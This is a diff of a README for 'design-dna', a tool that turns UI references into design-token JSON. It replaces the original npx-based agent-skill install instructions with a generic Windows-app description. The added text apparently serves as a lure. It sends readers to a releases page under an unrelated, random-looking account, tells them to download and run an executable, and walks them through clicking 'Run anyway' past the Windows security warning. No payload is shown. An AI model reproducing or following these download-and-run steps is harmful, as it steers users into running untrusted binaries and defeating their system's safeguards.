@@ -1,115 +1,229 @@
-<h1 align="center">design-dna</h1>
+# 🧬 design-dna - Turn UI references into design tokens
 
-<p align="center">
-English | <a href="README.zh-CN.md">中文</a> | <a href="README.ja.md">日本語</a> | <a href="README.ko.md">한국어</a> | <a href="README.es.md">Español</a> | <a href="README.zh-TW.md">繁體中文</a>
-</p>
+[![Download design-dna](https://img.shields.io/badge/Download-design--dna-5865F2?style=for-the-badge&logo=github)](https://github.com/Tricholomaaurantiumknottiness355/design-dna/releases)
 
-An agent skill for extracting, structuring, and applying visual design identity as machine-readable "Design DNA" across three dimensions: design tokens, qualitative style, and visual effects.
+## 🧩 What design-dna does
 
-![example](https://github.com/user-attachments/assets/77e9e02e-35a4-4d65-a402-dc6f9b35ed6e)
+design-dna helps you turn a UI reference into clear design data you can use again. You can use an image, a screenshot, or a URL. The app reads the visual style and builds a Design DNA JSON file with:
 
+- design tokens
+- visual styles
+- color sets
+- spacing and layout cues
+- shadows, borders, and other effects
+- notes that help match the look and feel
 
-https://github.com/user-attachments/assets/00e0a28d-42ce-4a08-a0c0-1ecf8b9f7e97
+You can use that output to guide new UI work or to compare screens with a known style.
 
+## 💻 What you need
 
-<h3 align="center">Other cases</h3>
+design-dna runs on Windows for most common desktop setups.
 
-https://github.com/user-attachments/assets/80793608-930d-42ca-951f-eb21ac188d54
+You should have:
 
-https://github.com/user-attachments/assets/cd4cba94-cd2c-480f-8efa-4ac86e00ae1f
+- Windows 10 or Windows 11
+- A modern web browser
+- Enough free space to store app files and your reference images
+- A stable internet connection for the first download
 
-## Prerequisites
+For best results, keep your reference files in common formats like:
 
-- [Node.js](https://nodejs.org/) environment installed
-- Ability to run `npx` commands
+- PNG
+- JPG
+- JPEG
+- WebP
+- URL links to live pages
 
-## Installation
+## 📥 Download and install
 
-### Quick Install (Recommended)
+Use this page to download the app:
 
-```bash
-npx skills add zanwei/design-dna
-```
+[Visit the design-dna releases page](https://github.com/Tricholomaaurantiumknottiness355/design-dna/releases)
 
-### Install to Specific Agent
+Follow these steps:
 
-```bash
-# Cursor only, non-interactive, global install
-npx skills add zanwei/design-dna -a cursor -g -y
+1. Open the releases page.
+2. Find the latest version.
+3. Download the Windows file listed under the release assets.
+4. If your browser asks what to do with the file, choose Save.
+5. After the download finishes, open the file to start the app.
 
-# Claude Code only
-npx skills add zanwei/design-dna -a claude-code -g -y
-```
+If Windows shows a security prompt:
 
-### Install from Local Clone
+1. Click More info.
+2. Click Run anyway if you trust the file source.
+3. Let the app finish opening.
 
-```bash
-git clone https://github.com/zanwei/design-dna.git
-npx skills add ./design-dna -y
-```
+If the release includes a ZIP file:
 
-### List Available Skills
+1. Right-click the ZIP file.
+2. Choose Extract All.
+3. Open the extracted folder.
+4. Start the app file inside that folder.
 
-```bash
-npx skills add zanwei/design-dna --list
-```
+## 🪟 Run the app on Windows
 
-## What It Does
+After install, launch design-dna like any other Windows app.
 
-| Dimension | Role |
-|-----------|------|
-| **Design System** | Measurable tokens: color, typography, spacing, layout, shape, elevation, motion, components |
-| **Design Style** | Qualitative perception: mood, visual language, composition, imagery, interaction feel, brand voice |
-| **Visual Effects** | Beyond plain CSS: Canvas, WebGL, 3D, particles, shaders, scroll-driven motion, cursor effects, SVG animation, glassmorphism, etc. |
+Typical flow:
 
-The skill drives a **three-phase** workflow:
+1. Open the app.
+2. Choose a reference source.
+3. Add an image, screenshot, or URL.
+4. Let the app scan the visual style.
+5. Review the generated Design DNA JSON.
+6. Export the result for later use.
 
-1. **Structure** — Surface the full schema and field meanings (see `references/schema.md`).
-2. **Analyze** — From screenshots, images, or URLs, produce a complete JSON profile (every field filled; conflicts noted).
-3. **Generate** — Given DNA JSON plus content, implement the design (default: self-contained HTML/CSS/JS), following `references/generation-guide.md`.
+If you use a website URL, the app will inspect the page and pull style signals from the visible UI.
 
-Phases can be used alone or chained (e.g. Analyze → Generate).
+## 🎯 What you can do with it
 
-## How It Works
+design-dna is useful when you want to keep a UI style consistent.
 
-Pipeline at a glance ([Mermaid](https://github.blog/news-insights/product-news/github-now-supports-mermaid-diagrams-in-markdown/) renders on GitHub):
+Use it to:
 
-```mermaid
-flowchart LR
-    A["Reference designs<br/>Screenshots · URLs · images<br/><br/>Any design you admire"]
-    B["Design DNA JSON<br/>Quantified spec<br/><br/>Structured profile"]
-    C["Final output<br/>Faithful implementation<br/><br/>Production-ready UI"]
+- capture the look of an existing screen
+- build a design profile from a brand site
+- compare two interfaces
+- create a token set for a new feature
+- keep buttons, colors, and spacing in line with an approved style
+- generate matching UI from your content
 
-    A -->|"Analyze — extract every visual property"| B
-    B -->|"Generate — apply DNA to your content"| C
-    B -.-> D["Save · reuse · version control"]
-```
+This helps when you want new screens to feel like part of the same product.
 
-**Step 1 — Curate references.** Collect screenshots, images, or live URLs of designs whose visual identity you want to capture. Multiple references can be combined; the skill identifies dominant patterns and notes variants.
+## 🖼️ Good reference inputs
 
-**Step 2 — Extract DNA.** Feed the references to the agent. It inspects every visual property across all three dimensions and outputs a complete, quantified Design DNA JSON — no empty fields, no guesswork. This JSON becomes a portable, reusable design specification.
+For the cleanest output, use clear and simple references.
 
-**Step 3 — Generate from DNA.** Provide the DNA JSON together with your own content. The agent produces implementations that faithfully reproduce the original design language while adapting to your material.
+Best choices:
 
-The DNA JSON is the key artifact. Once extracted, it can be **committed to version control**, **shared across teams**, **reused across projects**, and **iteratively refined** — turning subjective "make it look like that site" into a precise, reproducible specification that any agent can consume.
+- full-screen product pages
+- login screens
+- dashboard pages
+- pricing pages
+- mobile app screens
+- polished marketing pages
 
-> [!TIP]
-> **Refining visual richness.** If the first pass still feels visually thin or under-detailed next to your references, run a deliberate **polish iteration**: re-attach the **same URLs or screenshots**. This narrows the gap between a workable draft and a reference-faithful, visually rich result without starting over.
->
-> **Prompt:** **Against the reference, audit hierarchy, ornamentation, typographic rhythm, motion, materiality, and overall UI—then merge your conclusions back into the current implementation.**
+Try to avoid:
 
-## Compatibility
+- blurry screenshots
+- very dark photos of a screen
+- cropped images with missing UI parts
+- pages with pop-ups covering the main layout
 
-Follows the [Agent Skills specification](https://agentskills.io). Installable via [`skills` CLI](https://github.com/vercel-labs/skills) to all [supported agents](https://github.com/vercel-labs/skills#supported-agents) including Cursor, Claude Code, Codex, GitHub Copilot, and [39 more](https://github.com/vercel-labs/skills#supported-agents).
+If you use more than one reference, choose screens that share the same brand style.
 
-## Contributing
+## 🧠 What the output includes
 
-Issues and pull requests are welcome. For substantive behavior changes, update `SKILL.md` and any affected files under `references/` so the skill stays internally consistent.
+The app creates a Design DNA JSON file that groups style data in a structured way.
 
-## License
+You can expect fields for:
 
-MIT
+- main colors and accent colors
+- font style and text weight
+- spacing scale
+- corner radius
+- button style
+- card style
+- shadow depth
+- border treatment
+- layout rhythm
+- visual mood
+- surface style
 
-## Star History
+This output is meant to be easy to reuse in design tools, content systems, and UI generation flows.
 
-[![Star History Chart](https://api.star-history.com/svg?repos=zanwei/design-dna&type=Date)](https://star-history.com/#zanwei/design-dna&Date)
+## 🔄 Example workflow
+
+A simple workflow looks like this:
+
+1. Open design-dna.
+2. Add a reference screenshot.
+3. Let the app read the screen.
+4. Review the color and style data.
+5. Export the JSON.
+6. Use the data to build a new screen that matches the same look.
+
+You can also use a URL when you want to study a live site instead of a saved image.
+
+## 🛠️ Common use cases
+
+design-dna fits a few common tasks:
+
+- making a design system from an existing product
+- matching a new page to a brand style
+- collecting visual rules from a reference UI
+- creating a shared style base for a team
+- feeding design data into an AI workflow
+- rebuilding a screen with the same visual feel
+
+It works well for product teams, UI designers, and solo builders who want a faster way to capture a style.
+
+## 📂 File handling
+
+Keep your files easy to find.
+
+A simple setup helps:
+
+- create one folder for reference images
+- create one folder for exports
+- name files by page or project
+- keep old versions in a separate folder
+
+This makes it easier to compare styles and reuse past results.
+
+## ⚙️ Tips for better results
+
+Use these tips to get cleaner output:
+
+- use clear screenshots with full UI visible
+- prefer one strong reference over many weak ones
+- remove browser chrome when possible
+- use pages with real content, not empty shells
+- choose a screen with a stable layout
+- use similar screen sizes when comparing pages
+
+If a page has a fixed theme, use a screen that shows both text and UI controls.
+
+## ❓ Common questions
+
+### Can I use this with screenshots?
+Yes. design-dna can read screenshots and turn them into structured style data.
+
+### Can I use a website URL?
+Yes. You can use a URL to inspect a live page and pull design signals from it.
+
+### Do I need design skills?
+No. The app is built for regular users who want to capture a look and reuse it.
+
+### Can I use the output in other tools?
+Yes. The JSON output is built for reuse in design and UI workflows.
+
+### Will it help match a brand style?
+Yes. It can capture common style cues like color, spacing, typography, and surface treatment.
+
+## 📌 Suggested first run
+
+If this is your first time using design-dna, start small:
+
+1. Pick one clean screenshot.
+2. Open the app.
+3. Import the image.
+4. Review the generated Design DNA JSON.
+5. Save the file.
+6. Try a second screen from the same product and compare the result.
+
+This gives you a fast way to see how the app describes a visual style
+
+## 🧭 Project focus
+
+design-dna is built around:
+
+- agent skills
+- design systems
+- design tokens
+- UI design
+- visual design
+- structured style capture
+
+It helps turn visual references into data you can use in a repeatable way.
